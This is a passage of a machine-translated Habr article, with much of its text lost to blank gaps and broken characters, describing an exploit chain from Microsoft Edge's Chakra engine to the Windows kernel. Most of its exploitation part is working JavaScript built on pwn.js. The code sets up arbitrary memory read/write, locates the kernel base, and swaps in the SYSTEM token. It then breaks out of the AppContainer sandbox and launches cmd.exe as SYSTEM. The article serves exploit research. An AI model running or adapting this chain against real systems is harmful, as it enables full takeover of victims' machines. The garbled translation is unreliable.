<code>call</code> et <code>jmp</code> . </li></ol><br><h3 id="arbitrary-code-guard-acg">  Garde de code arbitraire ( <code>ACG</code> ) </h3><br><blockquote>  <code>ACG</code> est une technologie qui emp√™che la g√©n√©ration de code dynamique (il est interdit d'allouer des zones de m√©moire <code>VirtaulAlloc</code> aide de <code>VirtaulAlloc</code> ) et ses modifications (il est impossible de <code>VirtaulAlloc</code> zone de m√©moire disponible en ex√©cutable) </blockquote><p>  Cette protection, comme <code>CFG</code> , n'emp√™che pas l'utilisation de cha√Ænes <code>ROP</code> . </p><br><h3 id="appcontainer-isolation">  Isolement AppContainer </h3><br><blockquote>  AppContainer est une technologie Microsoft qui vous permet d'isoler un processus en l'ex√©cutant dans un environnement en bac √† sable.  Cette technologie restreint l'acc√®s d'un processus aux informations d'identification, aux appareils, √† un syst√®me de fichiers, √† un r√©seau, √† d'autres processus et fen√™tres et vise √† minimiser les capacit√©s des logiciels malveillants capables d'ex√©cuter du code arbitraire dans un processus. </blockquote><p>  Cette protection complique grandement le processus de fonctionnement.  √Ä cause de cela, nous ne pouvons pas appeler des fichiers ex√©cutables tiers ou acc√©der √† des informations utilisateur sensibles en m√©moire ou sur des disques.  Cependant, cette protection peut √™tre surmont√©e en utilisant des vuln√©rabilit√©s dans la mise en ≈ìuvre du sandbox AppContainer ou en augmentant les privil√®ges en exploitant les vuln√©rabilit√©s dans le noyau du syst√®me d'exploitation. </p><br><p>  Il convient de noter que <code>Microsoft</code> dispose d'un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">programme de r√©compense</a> distinct pour les techniques de contournement <code>security mitigation</code> technologies d' <code>security mitigation</code> .  Le programme indique que la r√©utilisation de code ex√©cutable (la cr√©ation de cha√Ænes <code>ROP</code> est une variante de cette technique) ne rel√®ve pas du programme, car  est un probl√®me architectural. </p><br><h3 id="ispolzovanie-pwnjs">  Utilisation de pwn.js </h3><br><p>  √Ä partir d'une analyse de toutes les technologies de s√©curit√©, il s'ensuit que pour pouvoir ex√©cuter du code arbitraire, vous devez contourner le sandbox <code>AppContainer</code> .  Dans cet article, nous d√©crivons une m√©thode utilisant une vuln√©rabilit√© dans le noyau <code>Windows</code> .  Dans ce cas, nous ne pouvons utiliser que du code <code>JS</code> et des cha√Ænes <code>ROP</code> .  √âcrire un exploit pour le noyau en utilisant uniquement des cha√Ænes <code>ROP</code> peut √™tre tr√®s difficile.  Pour simplifier cette t√¢che, vous pouvez trouver un ensemble de gadgets avec lesquels nous pourrions appeler les m√©thodes <code>WinAPI</code> n√©cessaires.  Heureusement, cela est d√©j√† impl√©ment√© dans la biblioth√®que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><code>pwn.js</code></a>  En l'utilisant, apr√®s avoir d√©crit uniquement les fonctions de lecture et d'√©criture pour la lecture et l'√©criture arbitraires, vous pouvez obtenir une <code>API</code> pratique pour trouver les fonctions <code>WinAPI</code> n√©cessaires et les appeler.  <code>pwn.js</code> fournit √©galement un outil pratique pour travailler avec des valeurs 64 bits et des pointeurs et des outils pour travailler avec des structures. </p><br><p>  Prenons un exemple simple.  √Ä l'√©tape pr√©c√©dente, nous avons obtenu une cha√Æne de deux <code>DataView</code> associ√©s.  Pour pr√©parer l'exploit, vous devez cr√©er la classe suivante: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="Pwned"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI ‚Äî   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="Finale"></p><br><p>   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog">  R√©sum√© </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  Mat√©riaux </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Liu Jin ‚Äî The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Andrew Wesie, Brian Pak ‚Äî 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Natalie Silvanovich ‚Äî The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Natalie Silvanovich ‚Äî Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team ‚Äî cve-2018-8629-chakra.js</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Quarkslab ‚Äî Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Siberas ‚Äî Kernel Exploitation Case Study ‚Äî "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Saif El-Sherei ‚Äî Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Diego Juarez ‚Äî Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Nicolas A. Economou ‚Äî Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr455594/">https://habr.com/ru/post/fr455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr455584/index.html">Entretiens personnalis√©s avec les forces internes de l'entreprise: des erreurs aux d√©couvertes</a></li>
<li><a href="../fr455586/index.html">S√©rie de conf√©rences sur la robotique par le professeur Gregor Sch√∂ner, directeur de l'Institut de neuroinformatique (INI) Bochum, Allemagne</a></li>
<li><a href="../fr455588/index.html">Comment √©duquer votre communaut√© pour ne pas danser avec un tambourin</a></li>
<li><a href="../fr455590/index.html">MVCC dans PostgreSQL-8. Cong√©lation</a></li>
<li><a href="../fr455592/index.html">Les virus attaquant les entreprises industrielles comme une menace pour la s√©curit√© physique</a></li>
<li><a href="../fr455596/index.html">DevConfX :: Management - rapports des managers en mots simples</a></li>
<li><a href="../fr455598/index.html">Mettre √† jour Exim √† 4.92 de toute urgence - il y a une infection active</a></li>
<li><a href="../fr455600/index.html">La plateforme 3DEXPERIENCE aide √† cr√©er les transports publics du futur</a></li>
<li><a href="../fr455602/index.html">Provoquer un crash du navigateur avec fuzzing comportemental</a></li>
<li><a href="../fr455604/index.html">Possibilit√© de g√©rer la configuration de Windows. Histoire de r√©ussite</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>